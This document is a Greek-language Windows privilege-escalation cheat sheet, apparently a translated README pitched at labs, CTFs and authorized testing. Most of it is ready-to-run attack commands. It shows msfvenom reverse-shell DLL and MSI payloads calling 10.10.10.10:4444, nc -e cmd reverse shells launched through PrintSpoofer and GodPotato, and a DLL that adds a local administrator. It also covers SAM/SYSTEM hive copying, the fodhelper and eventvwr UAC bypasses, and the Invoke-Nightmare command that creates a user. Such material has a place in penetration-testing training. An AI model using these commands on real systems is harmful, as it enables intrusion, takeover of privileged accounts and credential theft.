# 🪟 Windows — Πλήρης οδηγός κλιμάκωσης προνομίων

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Οδηγός ελέγχων κλιμάκωσης προνομίων σε Windows</b>
</p>

---

## Πριν ξεκινήσετε

Στα Windows, η **κλιμάκωση προνομίων (privilege escalation)** αφορά απόκτηση ισχυρότερης δυνατότητας πρόσβασης από την αρχική. Ο τοπικός διαχειριστής και το **NT AUTHORITY\SYSTEM** είναι διαφορετικά περιβάλλοντα ασφάλειας. Εξετάζετε χρήστη, ομάδες, προνόμια, υπηρεσίες και ρυθμίσεις μαζί.

**Βασικοί όροι:** access token = στοιχεία ταυτότητας και προνομίων διεργασίας, ACL = λίστα δικαιωμάτων αντικειμένου, service = υπηρεσία παρασκηνίου, registry = μητρώο ρυθμίσεων, DLL = βιβλιοθήκη που φορτώνεται από πρόγραμμα, impersonation = προσωρινή χρήση ταυτότητας άλλου χρήστη, UAC = μηχανισμός ελέγχου ανύψωσης δικαιωμάτων.

Διακρίνετε cmd από PowerShell· το πρωτότυπο τα αναμειγνύει σε μερικά blocks. Τα σχόλια με # είναι επεξηγήσεις και δεν είναι σύνταξη σχολίων του cmd. Το sc εδώ αφορά το εργαλείο υπηρεσιών του cmd, όχι την ομώνυμη συντόμευση άλλου shell. Οι εντολές αφορούν εργαστήρια ή εγκεκριμένους ελέγχους και δεν εκτελούνται κατά τη μετάφραση.

## 📋 Περιεχόμενα

- [Συλλογή πληροφοριών](#section-01)
- [Έλεγχος αδυναμιών υπηρεσιών](#section-02)
- [Διαδρομές υπηρεσιών χωρίς εισαγωγικά](#section-03)
- [Κατάχρηση της φόρτωσης βιβλιοθηκών (DLL Hijacking)](#section-04)
- [AlwaysInstallElevated](#section-05)
- [Αποθηκευμένα διαπιστευτήρια](#section-06)
- [Διαχείριση tokens](#section-07)
- [Οικογένεια τεχνικών Potato](#section-08)
- [Εκμετάλλευση αδυναμιών στο μητρώο των Windows (Registry)](#section-09)
- [Προγραμματισμένες εργασίες](#section-10)
- [Παράκαμψη ελέγχου λογαριασμού χρήστη (UAC Bypass)](#section-11)
- [Εκμετάλλευση ευπαθειών του πυρήνα (Kernel)](#section-12)
- [Γρήγορη αναφορά](#section-13)
- [Πηγές](#section-14)

---

<a id="section-01"></a>

## 🔍 Συλλογή πληροφοριών

> **Διαθεσιμότητα και γλώσσα συστήματος:** WMIC/Get-WmiObject και παλιά εργαλεία μπορεί να μην υπάρχουν σε νεότερη εγκατάσταση ή PowerShell. Ονόματα ομάδων όπως Administrators/Everyone και φίλτρα εξόδου μπορεί να διαφέρουν ανά γλώσσα. Απουσία εξόδου δεν αποδεικνύει απουσία σχετικής ρύθμισης.


### Πληροφορίες συστήματος

```cmd
# Πληροφορίες συστήματος
systeminfo
hostname

# Έκδοση λειτουργικού συστήματος
ver
wmic os get caption,version,buildnumber

# Αρχιτεκτονική
echo %PROCESSOR_ARCHITECTURE%

# Ενημερώσεις και διορθώσεις
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Πληροφορίες χρήστη

```cmd
# Τρέχων χρήστης
whoami
whoami /all
whoami /priv
whoami /groups

# Όλοι οι χρήστες
net user
net localgroup administrators

# Πληροφορίες χρήστη
net user username

# Τρέχοντα προνόμια
whoami /priv
```

### Πληροφορίες δικτύου

```cmd
# Ρυθμίσεις IP
ipconfig /all

# Διαδρομές δικτύου
route print

# Θύρες σε ακρόαση
netstat -ano
netstat -an | findstr LISTENING

# Πίνακας αντιστοίχισης διευθύνσεων ARP
arp -a

# Προσωρινά αποθηκευμένες απαντήσεις DNS
ipconfig /displaydns
```

### Διεργασίες και υπηρεσίες

```cmd
# Διεργασίες σε εκτέλεση
tasklist
tasklist /svc
wmic process list full

# Υπηρεσίες
sc query
net start
wmic service list brief

# Οδηγοί συσκευών
driverquery
```

### Συλλογή πληροφοριών με PowerShell

```powershell
# Πληροφορίες συστήματος
Get-ComputerInfo

# Users — χρήστες
Get-LocalUser
Get-LocalGroupMember Administrators

# Υπηρεσίες
Get-Service

# Διεργασίες
Get-Process

# Εγκατεστημένο λογισμικό
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="section-02"></a>

## ⚙️ Έλεγχος αδυναμιών υπηρεσιών

> **Τι μπορείτε να αλλάξετε και ποιος το εκτελεί:** Διαφέρουν τα δικαιώματα στο αντικείμενο υπηρεσίας, στο εκτελέσιμο και στο μητρώο. Χρειάζονται κατάλληλος λογαριασμός εκτέλεσης και δυνατότητα ενεργοποίησης ή επανεκκίνησης. Το Get-ModifiableService είναι πρόσθετη συνάρτηση εργαλείου, όχι ενσωματωμένη εντολή PowerShell.


### Αναζήτηση υπηρεσιών που χρειάζονται έλεγχο

```cmd
# Προβολή: υπηρεσίες
sc query state= all

# Δικαιώματα υπηρεσιών
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Έλεγχος συγκεκριμένης υπηρεσίας
sc qc servicename
```

### Ανεπαρκείς περιορισμοί δικαιωμάτων υπηρεσίας

```cmd
# Αν μπορείτε να τροποποιήσετε τη ρύθμιση υπηρεσίας:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Μη ασφαλή δικαιώματα στο εκτελέσιμο υπηρεσίας

```cmd
# Έλεγχος δικαιωμάτων εκτελέσιμου
icacls "C:\Program Files\Service\binary.exe"

# Αν επιτρέπεται εγγραφή, παράδειγμα αντικατάστασης εκτελέσιμου
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### Έλεγχος υπηρεσιών με PowerShell

```powershell
# Ανάγνωση πληροφοριών υπηρεσίας
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Αναζήτηση τροποποιήσιμων υπηρεσιών μέσω πρόσθετης συνάρτησης
Get-ModifiableService
```

---

<a id="section-03"></a>

## 📂 Διαδρομές υπηρεσιών χωρίς εισαγωγικά

> **Η απουσία εισαγωγικών δεν αρκεί:** Χρειάζονται κενά που δημιουργούν διαφορετικές υποψήφιες διαδρομές, δικαίωμα εγγραφής στην κατάλληλη θέση και εκτέλεση με ισχυρότερα δικαιώματα. Τα φίλτρα του πρωτοτύπου παράγουν υποψήφιες περιπτώσεις, όχι επιβεβαιωμένα ευρήματα.


### Αναζήτηση διαδρομών χωρίς εισαγωγικά

```cmd
# Αναζήτηση διαδρομών υπηρεσιών χωρίς εισαγωγικά
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Παράδειγμα διαδρομής χωρίς εισαγωγικά

```
# Αν η διαδρομή είναι: C:\Program Files\Vulnerable Service\service.exe
# Τα Windows εξετάζουν υποψήφιες διαδρομές:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Τοποθέτηση εκτελέσιμου εργαστηριακού παραδείγματος:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Επανεκκίνηση υπηρεσίας
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

<a id="section-04"></a>

## 📚 Κατάχρηση της φόρτωσης βιβλιοθηκών (DLL Hijacking)

> **Η σειρά αναζήτησης δεν είναι πάντα αυτή της λίστας:** Επηρεάζεται από τύπο εφαρμογής, KnownDLLs, manifests, Safe DLL Search Mode και επιλογές φόρτωσης. Ένα NAME NOT FOUND δεν αρκεί χωρίς ελεγχόμενη διαδρομή και πραγματική φόρτωση. Το block C αναμειγνύει εντολή msfvenom και πηγαίο κώδικα· δεν είναι ενιαίο έτοιμο αρχείο προς μεταγλώττιση. Δείτε τη [σειρά αναζήτησης DLL της Microsoft](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order).


### Αναζήτηση DLL που δεν εντοπίζονται

```cmd
# Χρήση Process Monitor για αναζήτηση μη εντοπισμένων DLL
# Φίλτρο: Result = NAME NOT FOUND, διαδρομή με κατάληξη .dll

# Ενδεικτικές τοποθεσίες του πρωτοτύπου:
# 1. Φάκελος εφαρμογής
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Τρέχων κατάλογος
# 5. Φάκελοι της μεταβλητής PATH
```

### Παράδειγμα δημιουργίας DLL για εργαστηριακό έλεγχο

```c
// Παράδειγμα δημιουργίας δοκιμαστικής εισόδου με msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Εναλλακτικά, παράδειγμα κώδικα DLL προς μεταγλώττιση:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Παράδειγμα επαλήθευσης

```cmd
# Αντιγραφή DLL σε τροποποιήσιμο φάκελο της διαδρομής αναζήτησης
copy evil.dll "C:\Program Files\App\missing.dll"

# Πρόκληση φόρτωσης DLL από την εφαρμογή
# Επανεκκίνηση υπηρεσίας ή εφαρμογής
```

---

<a id="section-05"></a>

## 📦 AlwaysInstallElevated

> **Έλεγχος δύο πολιτικών:** Οι τιμές πρέπει να είναι 1 και στο HKCU και στο HKLM για το συγκεκριμένο σενάριο ανύψωσης Windows Installer. Η εκτέλεση MSI είναι εγκατάσταση που αλλάζει κατάσταση. Δείτε την [τεκμηρίωση AlwaysInstallElevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated).


### Έλεγχος σχετικών ρυθμίσεων

```cmd
# Και οι δύο τιμές πρέπει να είναι 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Παράδειγμα επαλήθευσης

```bash
# Δημιουργία MSI του εργαστηριακού παραδείγματος
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Μεταφορά και εκτέλεση κατά το πρωτότυπο
msiexec /quiet /qn /i evil.msi
```

---

<a id="section-06"></a>

## 🔑 Αποθηκευμένα διαπιστευτήρια

> **Αποθήκευση δεν σημαίνει έτοιμη πρόσβαση:** Το cmdkey δεν εμφανίζει αυτόματα κάθε μυστικό ούτε κάθε εγγραφή χρησιμοποιείται από το runas. Τα ενεργά αρχεία SAM/SYSTEM μπορεί να είναι κλειδωμένα ακόμη και με υψηλά δικαιώματα. Η γραμμή με wildcard στο type δεν είναι εγγυημένη αναζήτηση σε όλα τα προφίλ χρηστών.


### Διαχείριση διαπιστευτηρίων (Credential Manager)

```cmd
# Καταγραφή αποθηκευμένων διαπιστευτηρίων
cmdkey /list

# Χρήση αποθηκευμένων διαπιστευτηρίων όπου υποστηρίζεται
runas /savecred /user:Administrator cmd.exe
```

### Αρχεία μητρώου SAM και SYSTEM

```cmd
# Αντιγραφή αρχείων SAM· απαιτούνται κατάλληλα δικαιώματα και πρόσβαση στα αρχεία
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Από στιγμιότυπα τόμου
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Διαπιστευτήρια στο μητρώο

```cmd
# Κωδικοί αυτόματης σύνδεσης
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Αποθηκευμένες ρυθμίσεις κωδικών VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Αποθηκευμένες συνεδρίες PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Αρχεία με πιθανά διαπιστευτήρια

```cmd
# Αναζήτηση πιθανών κωδικών
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Αρχεία αυτοματοποιημένης εγκατάστασης (Unattend)
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# Ιστορικό PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Ρυθμίσεις IIS
type C:\inetpub\wwwroot\web.config
```

### Αποθηκευμένοι κωδικοί WiFi

```cmd
# Καταγραφή προφίλ δικτύων
netsh wlan show profiles

# Εμφάνιση αποθηκευμένου κλειδιού όπου επιτρέπεται
netsh wlan show profile name="SSID" key=clear
```

---

<a id="section-07"></a>

## 🎭 Διαχείριση tokens

> **Προνόμιο και τρόπος χρήσης:** Η παρουσία SeImpersonate/SeBackup/SeRestore δεν αποδεικνύει αυτόματα πλήρη κλιμάκωση. Χρειάζονται ενεργοποίηση όπου απαιτείται, κατάλληλο API/λειτουργία, πόρος και συνθήκες συστήματος. Το backup mode δεν παρακάμπτει γενικά κλείδωμα αρχείου. Δείτε τα [προνόμια Windows της Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).


### Έλεγχος προνομίων

```cmd
whoami /priv

# Προνόμια που χρειάζονται διερεύνηση:
# SeImpersonatePrivilege — προσωρινή χρήση ταυτότητας άλλου χρήστη
# SeAssignPrimaryTokenPrivilege — εκχώρηση κύριου token
# SeTcbPrivilege — λειτουργία ως μέρος του έμπιστου συστήματος
# SeBackupPrivilege — λειτουργίες αντιγράφων ασφαλείας
# SeRestorePrivilege — λειτουργίες επαναφοράς αρχείων
# SeCreateTokenPrivilege — δημιουργία token
# SeLoadDriverPrivilege — φόρτωση οδηγών
# SeTakeOwnershipPrivilege — ανάληψη κυριότητας αντικειμένων
# SeDebugPrivilege — πρόσβαση αποσφαλμάτωσης διεργασιών
```

### SeImpersonatePrivilege

```cmd
# Αν το SeImpersonatePrivilege είναι ενεργό:
# Εξέταση συμβατών τεχνικών Potato ή PrintSpoofer, ανά περιβάλλον

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Δικαιώματα ανάγνωσης μέσω μηχανισμού backup, με τις προϋποθέσεις της υλοποίησης
# Αντιγραφή SAM και SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Δικαιώματα εγγραφής μέσω μηχανισμού restore, με τις προϋποθέσεις της υλοποίησης
# Παράδειγμα αντικατάστασης αρχείων συστήματος
```

---

<a id="section-08"></a>

## 🥔 Οικογένεια τεχνικών Potato

> **Ιστορικά εργαλεία και περιορισμοί:** Οι ετικέτες εκδόσεων δεν αποτελούν εγγύηση συμβατότητας. JuicyPotato, RoguePotato, GodPotato και PrintSpoofer έχουν διαφορετικές προϋποθέσεις token, υπηρεσιών και δικτύου. Επιβεβαιώστε build, ενημερώσεις και την τεκμηρίωση του συγκεκριμένου εργαλείου.


### JuicyPotato — οι εκδόσεις του τίτλου χρειάζονται επιβεβαίωση

```cmd
# Απαιτεί SeImpersonatePrivilege ή SeAssignPrimaryToken και συμβατό περιβάλλον
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer — ενδεικτικές εκδόσεις Windows 10/Server 2016+

```cmd
# Απαιτεί SeImpersonatePrivilege και τις υπόλοιπες προϋποθέσεις της τεχνικής
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato — ενδεικτικές εκδόσεις Windows 10/11/Server 2019-2022

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

<a id="section-09"></a>

## 📝 Εκμετάλλευση αδυναμιών στο μητρώο των Windows (Registry)

> **Η εγγραφή δεν δίνει μόνη της SYSTEM:** Η επίδραση Run/RunOnce εξαρτάται από ποιος συνδέεται και εκτελεί το πρόγραμμα. Η δυνατότητα αλλαγής ImagePath χρειάζεται κατάλληλα δικαιώματα και εκτέλεση της υπηρεσίας. Μια ρύθμιση αυτόματης εκκίνησης δεν ταυτίζεται με άμεση κλιμάκωση.


### Αυτόματη εκκίνηση εφαρμογών (AutoRuns)

```cmd
# Έλεγχος τοποθεσιών αυτόματης εκκίνησης
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Αν επιτρέπεται εγγραφή, προσθήκη της εγγραφής του παραδείγματος
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Κλειδιά μητρώου υπηρεσιών

```cmd
# Έλεγχος δικαιωμάτων κλειδιών μητρώου υπηρεσιών
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Τροποποίηση ImagePath της υπηρεσίας
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

<a id="section-10"></a>

## ⏰ Προγραμματισμένες εργασίες

> **Δικαιώματα της ίδιας της εργασίας:** Τροποποιήσιμο script χρειάζεται να εκτελείται με ισχυρότερη ταυτότητα. Δυνατότητα δημιουργίας κάποιας εργασίας δεν σημαίνει δικαίωμα δημιουργίας εργασίας ως SYSTEM.


### Καταγραφή προγραμματισμένων εργασιών

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Αναζήτηση τροποποιήσιμων scripts εργασιών

```cmd
# Αν η εργασία εκτελεί script που μπορείτε να τροποποιήσετε:
icacls "C:\Scripts\backup.bat"

# Προσθήκη εντολής εργαστηριακού παραδείγματος
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Παράδειγμα δημιουργίας προγραμματισμένης εργασίας

```cmd
# Αν έχετε τα απαραίτητα δικαιώματα δημιουργίας της εργασίας
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="section-11"></a>

## 🛡️ Παράκαμψη ελέγχου λογαριασμού χρήστη (UAC Bypass)

> **Διαφορετικό από απόκτηση νέου λογαριασμού διαχειριστή:** Τα ιστορικά παραδείγματα προϋποθέτουν κατάλληλη κατάσταση token, πολιτική και έκδοση. Συχνά αφορούν ήδη μέλος Administrators με περιορισμένο token, όχι αυθαίρετο απλό χρήστη. Οι αλλαγές μητρώου παραμένουν μέχρι να αναιρεθούν. Δείτε [πώς λειτουργεί το UAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works).


### Έλεγχος ρυθμίσεων UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Έλεγχος παραδείγματος μέσω Fodhelper

```cmd
# Ιστορικό παράδειγμα Windows 10· η συμβατότητα εξαρτάται από έκδοση και πολιτική
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Καθαρισμός των αλλαγών του παραδείγματος
reg delete HKCU\Software\Classes\ms-settings /f
```

### Έλεγχος παραδείγματος μέσω EventViewer

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

<a id="section-12"></a>

## 💣 Εκμετάλλευση ευπαθειών του πυρήνα (Kernel)

> **Ο πίνακας δεν περιέχει μόνο τοπικά σφάλματα πυρήνα:** MS08-067/MS17-010 αφορούν δικτυακές υπηρεσίες, ενώ PrintNightmare τον Print Spooler. Το All του πρωτοτύπου δεν είναι ακριβής λίστα επηρεαζόμενων εκδόσεων. Τίτλος Windows ή παρουσία Spooler δεν αποδεικνύει ευπάθεια. Το δείγμα PrintNightmare αναφέρει CVE-2021-34527 αλλά φορτώνει αρχείο με άλλο CVE στο όνομα· χρειάζεται έλεγχος προέλευσης και περιεχομένου.


### Έλεγχος πληροφοριών συστήματος

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Γνωστά παραδείγματα εκμετάλλευσης

| CVE | Εκδόσεις Windows κατά το πρωτότυπο | Όνομα |
| ----- | ----------------- | ------ |
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | Συγκεκριμένες μη διορθωμένες εκδόσεις Windows/SMB | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | Εξαρτάται από έκδοση, ενημερώσεις και ρύθμιση Print Spooler | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Έλεγχος ενδείξεων ευπάθειας
Get-Service Spooler

# Παράδειγμα PowerShell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

<a id="section-13"></a>

## 📊 Γρήγορη αναφορά

### Συλλογή πληροφοριών με σύντομες εντολές

```cmd
# Σύντομη συλλογή πληροφοριών
whoami /all & systeminfo & net user

# Έλεγχος διαθέσιμων προνομίων
whoami /priv

# Υπηρεσίες
wmic service get name,pathname | findstr /i /v "c:\windows"

# Προγραμματισμένες εργασίες
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Αυτοματοποιημένα εργαλεία

| Εργαλείο | Περιγραφή |
| ------ | ------------- |
| **WinPEAS** | Αναλυτική συλλογή πληροφοριών συστήματος |
| **PowerUp** | Έλεγχοι κλιμάκωσης προνομίων με PowerShell |
| **Seatbelt** | Έλεγχοι ρυθμίσεων ασφάλειας |
| **SharpUp** | Έλεγχοι κλιμάκωσης προνομίων με C# |

### Λίστα αρχικών σημείων διερεύνησης

- [ ] `whoami /priv` — έλεγχος SeImpersonate
- [ ] Διαδρομές υπηρεσιών χωρίς εισαγωγικά
- [ ] Τροποποιήσιμα εκτελέσιμα υπηρεσιών
- [ ] AlwaysInstallElevated
- [ ] Αποθηκευμένα διαπιστευτήρια μέσω cmdkey /list
- [ ] Κωδικοί αυτόματης σύνδεσης στο μητρώο
- [ ] Μη ασφαλή δικαιώματα υπηρεσίας
- [ ] Scripts προγραμματισμένων εργασιών
- [ ] Έκδοση Windows και ενημερώσεις Print Spooler — πιθανό PrintNightmare;

---

<a id="section-14"></a>

## 📚 Πηγές

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks — κλιμάκωση προνομίων Windows](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Σχετικοί οδηγοί
- [WinPEAS — επίσημο αποθετήριο](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [Κλιμάκωση προνομίων Linux](../../Linux-PrivEsc/translations/README.el.md)

---

<p align="center">
  <b>🪟 Κατανοήστε τα προνόμια συστήματος στα Windows!</b><br>
  <i>Μεθοδική διερεύνηση κλιμάκωσης προνομίων Windows</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
